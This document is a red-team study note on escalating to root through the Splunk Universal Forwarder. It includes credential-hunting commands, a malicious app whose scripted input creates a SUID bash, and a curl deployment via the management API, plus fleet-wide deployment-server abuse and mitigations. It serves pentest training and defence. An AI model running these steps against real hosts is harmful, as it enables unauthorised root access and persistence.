---
tags: [linux, privesc, splunk, agents, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.39 Splunk Universal Forwarder LPE and Persistence"
---

# Splunk Universal Forwarder LPE and Persistence

## Introduction
The **Splunk Universal Forwarder (UF)** is a lightweight agent installed on endpoints/servers to ship logs to a Splunk indexer. It is **extremely common on enterprise hosts**, frequently runs as **root** (or a privileged service account), and — critically — exposes a **management port (default TCP 8089)** that accepts authenticated commands, including the ability to deploy and **run scripts/apps**. This combination makes the UF a reliable local privilege-escalation *and* lateral-movement / persistence vector: anyone who can authenticate to the management API (or who controls the deployment server) can make the forwarder execute arbitrary code in its (often root) context.

## Why the Forwarder Is Dangerous
```text
+---------------------------------------------------------------+
|             SPLUNK UF AS A ROOT CODE-EXEC ENGINE             |
+---------------------------------------------------------------+
|  Universal Forwarder runs as root, listens on :8089          |
|        |  REST mgmt API + "apps" that can include scripts     |
|        v                                                       |
|  Push/install a malicious Splunk "app" containing a script    |
|  (inputs.conf scripted input / bin/ script)                   |
|        |  forwarder executes it on its schedule               |
|        v                                                       |
|  script runs as ROOT  ->  shell / SUID / persistence          |
+---------------------------------------------------------------+
```
Splunk apps support **scripted inputs**: a script placed in an app's `bin/` and referenced by `inputs.conf` is run by the forwarder. If the forwarder runs as root, that script runs as root.

## Local Privilege Escalation
If you have a low-priv shell but can reach the local management port and have (or recover) the forwarder's admin credentials, or the install allows local app deployment:

1. **Locate the install and creds:**
   ```bash
   ps aux | grep -i splunkforwarder
   ls -la /opt/splunkforwarder/etc          # config, often readable
   netstat -ltnp | grep 8089
   # hunt for stored creds / hashes
   find /opt/splunkforwarder -name '*.conf' 2>/dev/null | xargs grep -il pass 2>/dev/null
   cat /opt/splunkforwarder/etc/passwd 2>/dev/null   # splunk user db (hashed)
   ```
2. **Build a malicious app** with a scripted input:
   ```text
   evilapp/
     default/inputs.conf   ->  [script://$SPLUNK_HOME/etc/apps/evilapp/bin/run.sh]
                                interval = 60
                                disabled = 0
     bin/run.sh            ->  #!/bin/sh
                                cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
   ```
3. **Deploy it** — drop it into `etc/apps/` if writable, or push via the REST API:
   ```bash
   curl -k -u admin:<pass> https://127.0.0.1:8089/services/apps/local \
     -F name=@evilapp.tgz -F filename=true
   ```
4. **Wait for the interval** → `run.sh` executes as root → use the SUID `bash` ([[03 - SUID Binaries Abuse]]).

## Lateral Movement & Persistence
- **Deployment server abuse:** if you compromise the Splunk **deployment server**, you can push a malicious app to **every** forwarder reporting to it — fleet-wide root code execution (a classic post-exploitation multiplier).
- **Persistence:** a scripted-input app re-runs on its interval across reboots; it blends in as legitimate Splunk activity, making it stealthy persistence on the host.
- **Credential reuse:** forwarder admin creds are often shared across many hosts → reach `:8089` on neighbours and repeat.

## Why It Matters in an Engagement
Splunk UF is ubiquitous, usually privileged, and purpose-built to run code you give it. It is one of the most reliable "agent-as-root" escalations on enterprise Linux (and Windows), and compromising the deployment server turns one foothold into the whole estate. Always enumerate for `splunkforwarder` and port 8089.

## Detection and Mitigation
- **Run the forwarder as a dedicated low-privilege account**, not root; restrict file permissions on `$SPLUNK_HOME`.
- Change default admin credentials, do **not** reuse them across hosts, and firewall the management port (8089) to trusted management hosts only.
- Disable local app deployment / scripted inputs where unneeded; sign/validate deployed apps; monitor new apps and scripted-input configs.
- Alert on the forwarder process spawning shells or creating SUID binaries.

## Chaining Opportunities
- SUID payload → [[03 - SUID Binaries Abuse]].
- Deployment-server compromise → mass code execution (overlaps Tools/Real-World and AD lateral movement).
- Same "privileged agent runs your code" pattern as other monitoring agents.

## Related Notes
- [[03 - SUID Binaries Abuse]]
- [[16 - Password in Config Files History Env Vars]]
- [[26 - Systemd Service File Abuse]]
- [[01 - Linux PrivEsc Methodology Overview]]
